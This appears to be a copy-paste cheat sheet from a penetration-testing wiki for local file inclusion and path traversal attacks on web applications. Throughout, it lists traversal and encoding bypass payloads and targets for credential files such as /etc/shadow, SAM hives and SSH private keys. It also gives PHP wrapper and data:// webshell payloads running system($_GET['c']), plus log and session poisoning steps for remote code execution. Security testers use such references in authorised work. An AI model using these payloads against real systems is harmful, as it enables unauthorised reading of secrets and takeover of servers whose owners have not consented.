# LFI / Path Traversal Payloads

Quick reference for Local File Inclusion and Path Traversal. Copy-paste ready.

## Basic Traversal

```
../
..\
..\/
..//..//
....//
..;/
```

## Traversal Sequences

```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

## URL Encoding

```
# Single encoding
%2e%2e%2f              # ../
%2e%2e/                # ../
..%2f                  # ../
%2e%2e%5c              # ..\

# Double encoding
%252e%252e%252f        # ../
..%252f                # ../
%252e%252e/            # ../

# 16-bit Unicode
%u002e%u002e%u002f     # ../
..%u2215               # ../
..%u2216               # ..\

# UTF-8 overlong
%c0%ae%c0%ae%c0%af     # ../
%c0%2e%c0%2e%c0%af     # ../
..%c0%af               # ../
..%c1%9c               # ..\
```

## Null Byte Injection (PHP < 5.3.4)

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd\x00
../../../etc/passwd\0
```

## Path Truncation (PHP < 5.3)

```
# Exceed 4096 chars
../../../etc/passwd/./././././[...]
../../../etc/passwd.....................[exceed limit]
```

## Linux Target Files

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/group
/etc/motd
/etc/mysql/my.cnf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/crontab
/etc/ssh/sshd_config
/etc/resolv.conf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/self/status
/proc/version
/proc/net/tcp
/proc/sched_debug
/proc/mounts
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log
/var/mail/www-data
/home/[user]/.ssh/id_rsa
/home/[user]/.ssh/authorized_keys
/home/[user]/.bash_history
/root/.ssh/id_rsa
/root/.bash_history
```

## Windows Target Files

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SOFTWARE
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\debug\NetSetup.log
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\passwords.txt
C:\xampp\php\php.ini
C:\Users\[user]\Desktop\
C:\Users\[user]\Documents\
C:\Users\[user]\.ssh\id_rsa
C:\boot.ini
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\inetsrv\config\applicationHost.config
```

## PHP Wrappers

```
# Base64 encode source (bypass extension filtering)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config.php

# Read with various filters
php://filter/read=string.rot13/resource=index.php
php://filter/read=string.toupper/resource=index.php
php://filter/read=zlib.deflate/resource=index.php

# Chain filters
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/convert.base64-decode|convert.base64-encode/resource=index.php

# RCE via data://
data://text/plain,<?php system($_GET['c']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==

# RCE via input (POST body = PHP code)
php://input

# RCE via expect (if enabled)
expect://id
expect://whoami

# RCE via phar (with serialized payload)
phar://uploads/shell.gif

# Zip wrapper
zip://uploads/shell.zip%23shell.php
```

## PHP Filter Chain RCE

```
# Generate chain: https://github.com/synacktiv/php_filter_chain_generator
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|[...]/resource=php://temp

# Basic webshell chain (shortened - use generator for full chain)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|[...chain...]/resource=php://temp
```

## Log Poisoning

```
# Apache/Nginx access log - inject via User-Agent
GET /<?php system($_GET['c']); ?> HTTP/1.1
User-Agent: <?php system($_GET['c']); ?>

# Then include:
/var/log/apache2/access.log&c=id
/var/log/apache2/error.log&c=id
/var/log/nginx/access.log&c=id
/proc/self/fd/0&c=id

# SSH auth log poisoning (username)
ssh '<?php system($_GET["c"]); ?>'@target
# Then include /var/log/auth.log

# Mail log poisoning
mail -s "<?php system(\$_GET['c']); ?>" www-data@localhost < /dev/null
# Then include /var/log/mail.log

# /proc/self/environ (via User-Agent)
User-Agent: <?php system($_GET['c']); ?>
# Then include /proc/self/environ
```

## Session File Poisoning

```
# PHP session location
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
C:\Windows\Temp\sess_[PHPSESSID]

# Set malicious session value via parameter
?lang=<?php system($_GET['c']); ?>
# Then include session file
```

## WAF Bypass Techniques

```
# Case variation
..\/
..\/ 
..;/

# Path normalization
/etc/passwd/.
/etc//passwd
/etc/./passwd
/./etc/passwd
//etc//passwd//

# Using ~
~root/.ssh/id_rsa
~www-data/.bash_history

# Backslash (Windows path normalized to /)
..\..\..\..\etc\passwd

# Mixed slashes
../..\..\../etc/passwd
..\../\..\/etc/passwd
```

## Double Encoding Bypass

```
%252e%252e%252f                    # ../
%252e%252e%255c                    # ..\
..%252f..%252f..%252fetc/passwd
%252e%252e%252f%252e%252e%252f
```

## UTF-8 / Overlong Encoding

```
# ../ variations
%c0%ae%c0%ae%c0%af
%e0%80%ae%e0%80%ae%e0%80%af
%c0%2e%c0%2e%c0%af

# / variations
%c0%af
%e0%80%af
%c0%2f
%c1%9c

# . variations
%c0%ae
%e0%80%ae
%c0%2e
```

## Wrapper Bypass (When php:// Blocked)

```
# Try alternate case
PHP://filter/convert.base64-encode/resource=index.php
pHp://filter/convert.base64-encode/resource=index.php

# Try without protocol
//filter/convert.base64-encode/resource=index.php

# URL encode wrapper
%70%68%70://filter/convert.base64-encode/resource=index.php
```

## Common Vulnerable Parameters

```
?file=
?page=
?path=
?dir=
?document=
?folder=
?root=
?include=
?inc=
?locate=
?doc=
?conf=
?template=
?lang=
?view=
?content=
?load=
?read=
?download=
?module=
?pg=
?layout=
?show=
?style=
?img=
?image=
?pdf=
?filename=
?filepath=
?src=
?source=
?cat=
?action=
?board=
```

## Quick Tests

```
# Basic test
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd

# PHP wrapper test
php://filter/convert.base64-encode/resource=index.php

# Null byte test (old PHP)
../../../etc/passwd%00.jpg

# Windows test
..\..\..\..\windows\win.ini
```

## Wordlists

```bash
# Linux paths
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# Windows paths
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# All platforms
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
```

---

!!! tip "Identify Context"
    Check if extension is appended, if null bytes work, what OS target is, and whether wrappers are enabled.

---
*See full [LFI methodology](../vulns/lfi/index.md) for detection and escalation.*
